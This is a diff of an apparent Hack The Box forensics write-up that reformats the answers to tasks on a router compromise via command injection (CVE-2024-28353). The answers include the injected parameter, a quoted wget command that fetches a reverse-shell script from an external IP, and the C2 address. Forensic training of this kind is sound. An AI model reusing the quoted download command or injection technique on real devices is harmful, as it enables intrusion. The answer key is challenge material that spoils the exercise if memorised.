@@ -22,9 +22,10 @@ So I filtered with `http.request.method == POST` to only have HTTP POST requests
 
 By trying to understand what happened, I kept inspecting each POST request which I finally found that potential command injection on the router so our hypothesis is confirmed at this point.
 
-```
-192.168.10.2
-```
+<details>
+  <summary>Answer</summary>
+<pre><code>192.168.10.2</code></pre>
+</details>
 
 >Task 2: What is the model name of the compromised router?
 
@@ -32,9 +33,10 @@ By trying to understand what happened, I kept inspecting each POST request which
 
 By searching for "model" string, we can see that there is model name of the router on defined on the web interface 
 
-```
-TEW-827DRU
-```
+<details>
+  <summary>Answer</summary>
+<pre><code>TEW-827DRU</code></pre>
+</details>
 
 >Task 3: How many failed login attempts did the attacker try before successfully logging into the router?
 
@@ -42,21 +44,26 @@ TEW-827DRU
 
 Now after filter out localhost with `http.request.method == POST && ip.addr == 192.168.10.2` then by inspecting first 3 HTTP POST requests (/apply_sec.cgi), we could see that there are 2 attempts to login into the router before successfully logged with with admin user without a password.
 
-```
-2
-```
+<details>
+  <summary>Answer</summary>
+<pre><code>2</code></pre>
+</details>
 
 >Task 4: At what UTC time did the attacker successfully log into the routers web admin interface?
 
 ![20b0143cb0735b0db632da044bcee9e0.png](/resources/20b0143cb0735b0db632da044bcee9e0.png)
-```
-2024-05-01 15:53:27
-```
+
+<details>
+  <summary>Answer</summary>
+<pre><code>2024-05-01 15:53:27</code></pre>
+</details>
 
 >Task 5: How many characters long was the password used to log in successfully?	
-```
-0
-```
+
+<details>
+  <summary>Answer</summary>
+<pre><code>0</code></pre>
+</details>
 
 >Task 6: What is the current firmware version installed on the compromised router?
 
@@ -68,9 +75,10 @@ We can filter for "fw" or "version" string which will lead us that the js file t
 
 Now we know that this router shorten the string "firmware" to "fw" so we can continue to search with "fw" then we will see that current firmware version installed on the router right here.
 
-```
-2.10
-```
+<details>
+  <summary>Answer</summary>
+<pre><code>2.10</code></pre>
+</details>
 
 >Task 7: Which HTTP parameter was manipulated by the attacker to get remote code execution on the system?
 
@@ -86,9 +94,10 @@ We can also confirm the other POST command with different payload, on this case 
 
 I made life easier by opened this pcap file on NetworkMiner than by filtered with common strings in os command injection payload we found then we will see that the attacker tried to download this bash script many times and once it got downloaded then the attacker used bash to execute it  
 
-```
-usbapps.config.smb_admin_name
-```
+<details>
+  <summary>Answer</summary>
+<pre><code>usbapps.config.smb_admin_name</code></pre>
+</details>
 
 >Task 8: What is the CVE number associated with the vulnerability that was exploited in this attack?
 
@@ -97,18 +106,20 @@ usbapps.config.smb_admin_name
 We have to approach here, by filtering for router model and firmware or by filtering for vulnerable parameter which will lead to one CVE which is [CVE-2024-28353 command injection vulnerability](https://warp-desk-89d.notion.site/TEW-827DRU-5c40fb20572148f0b00f329d69273791).
 
 
-```
-CVE-2024-28353
-```
+<details>
+  <summary>Answer</summary>
+<pre><code>CVE-2024-28353</code></pre>
+</details>
 
 >Task 9: What was the first command the attacker executed by exploiting the vulnerability?
 
 ![155f9c86c4056ffb8177e32dab26bb5c.png](/resources/155f9c86c4056ffb8177e32dab26bb5c.png)
 We know that the first command that the attacker tested and executed is `whoami`
 
-```
-whoami
-```
+<details>
+  <summary>Answer</summary>
+<pre><code>whoami</code></pre>
+</details>
 
 >Task 10: What command did the actor use to initiate the download of a reverse shell to the router from a host outside the network?
 
@@ -116,9 +127,10 @@ whoami
 
 As we can see that the attacker tried to download file from both external host and internal host 
 
-```
-wget http://35.159.25.253:8000/a1l4m.sh
-```
+<details>
+  <summary>Answer</summary>
+<pre><code>wget http://35.159.25.253:8000/a1l4m.sh</code></pre>
+</details>
 
 >Task 11: Multiple attempts to download the reverse shell from an external IP failed. When the actor made a typo in the injection, what response message did the server return?	
 
@@ -135,9 +147,10 @@ Lets go back to Wireshark, we can see the same payload on packet number 51885 so
 
 Look at the HTTP response, then we can see the error message right here.
 
-```
-Access to this resource is forbidden
-```
+<details>
+  <summary>Answer</summary>
+<pre><code>Access to this resource is forbidden</code></pre>
+</details>
 
 >Task 12: What was the IP address and port number of the command and control (C2) server when the actor's reverse shell eventually did connect? (IP:Port)
 
@@ -157,9 +170,10 @@ Take an extra step to filter on this port but evidently, there is no any packets
 
 Now, we came to the second approach that is using NetworkMiner and it will assemble files within pcap automatically upon opening the pcap file so if we opened the file from NetworkMiner then we will also have the same script we found earlier as well.
 
-```
-35.159.25.253:41143
-```
+<details>
+  <summary>Answer</summary>
+<pre><code>35.159.25.253:41143</code></pre>
+</details>
 
 ![14d2784a332c149451fb30174a4677e6.png](/resources/14d2784a332c149451fb30174a4677e6.png)
 https://labs.hackthebox.com/achievement/sherlock/1438364/841
